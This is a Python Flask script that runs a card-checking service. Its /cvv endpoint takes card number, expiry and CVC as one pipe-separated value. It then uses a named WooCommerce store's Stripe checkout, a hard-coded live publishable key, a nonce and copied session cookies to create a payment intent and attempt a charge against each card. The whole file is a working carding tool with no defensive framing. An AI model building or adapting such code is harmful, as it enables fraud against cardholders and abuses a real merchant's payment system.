from flask import Flask, request
import requests

app = Flask(__name__)

# Define the publishable key as a constant
PUBLISHABLE_KEY = "pk_live_51HtaSlHn70ahNgxXYf7PlnTgjJzu4WuXxj9nMVPLJywbVEcZmaTrt9HzP4Z0TQACZPM7BOBOJrexQD3L8zatvI5f00Pq3HyYoN"

# Function to create a payment intent
def create_payment_intent():
    url = "https://www.shoptodolist.com"

    params = {
        'wc-ajax': "wc_stripe_create_payment_intent"
    }

    payload = "_ajax_nonce=fff811a2ee"

    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-requested-with': "XMLHttpRequest",
        'origin': "https://www.shoptodolist.com",
        'sec-fetch-mode': "cors",
        'referer': "https://www.shoptodolist.com/checkout/",
        'Cookie': "woocommerce_cart_hash=b98df067d117e0f4100d8bf9302edc42; wp_woocommerce_session_c2d9ca82bee9357ee8f674d7935483f9=t_9584c6bafb452e334fd33d4d5bf26c%7C%7C1720151773%7C%7C1720148173%7C%7Cff4c172e2e7b4b7611bbd584cd5e8337"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)

    if response.status_code == 200:
        return response.json()["data"]["client_secret"]
    else:
        return None

def confirm_payment(client_secret, payment_method_id, publishable_key):
    # Extracting payment intent ID from client secret
    payment_intent_id = client_secret.split("_secret_")[0]

    # API endpoint to confirm payment intent
    confirm_payment_intent_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"

    # Payload data to confirm payment intent
    confirm_payment_intent_payload = {
        "payment_method": payment_method_id,
        "client_secret": client_secret,
        "return_url": "https://yourwebsite.com/success"  # Replace with your actual success URL
    }

    # Headers to confirm payment intent
    confirm_payment_intent_headers = {
        'Authorization': f'Bearer {publishable_key}',
        'Content-Type': "application/x-www-form-urlencoded",
    }

    # Send the request to confirm payment intent
    confirm_response = requests.post(confirm_payment_intent_url, data=confirm_payment_intent_payload, headers=confirm_payment_intent_headers)

    # Return the raw response
    return confirm_response.text

def create_payment_method(card_number, exp_month, exp_year, cvc, publishable_key):
    # API endpoint to create a payment method
    create_payment_method_url = "https://api.stripe.com/v1/payment_methods"

    # Payload data to create a payment method
    create_payment_method_payload = {
        "type": "card",
        "card[number]": card_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc
    }

    # Request headers to create a payment method
    create_payment_method_headers = {
        'Authorization': f'Bearer {publishable_key}',
        'Content-Type': "application/x-www-form-urlencoded",
    }

    # Send the request to create a payment method
    response = requests.post(create_payment_method_url, data=create_payment_method_payload, headers=create_payment_method_headers)

    return response

@app.route('/cvv', methods=['GET'])
def handle_cvv():
    # Check if all required parameters are provided
    required_params = ['cc']
    missing_params = [param for param in required_params if param not in request.args]
    if missing_params:
        return f'Missing parameters: {", ".join(missing_params)}', 400

    # Extracting parameters from the request URL
    card_info = request.args.get('cc').split('|')
    card_number = card_info[0]
    exp_month = card_info[1]
    exp_year = card_info[2]
    cvc = card_info[3]

    # Generate payment intent
    client_secret = create_payment_intent()

    if not client_secret:
        return 'Failed to create payment intent', 500

    # Create payment method
    response = create_payment_method(card_number, exp_month, exp_year, cvc, PUBLISHABLE_KEY)

    # Check if the request was successful
    if response.status_code == 200:
        # Extract payment method ID from the response
        payment_method_id = response.json()["id"]

        # Confirm payment
        confirm_response = confirm_payment(client_secret, payment_method_id, PUBLISHABLE_KEY)

        return confirm_response

    else:
        # Return error message
        return response.text

if __name__ == '__main__':
    app.run(host='0.0.0.0', port= 8080, debug=True)
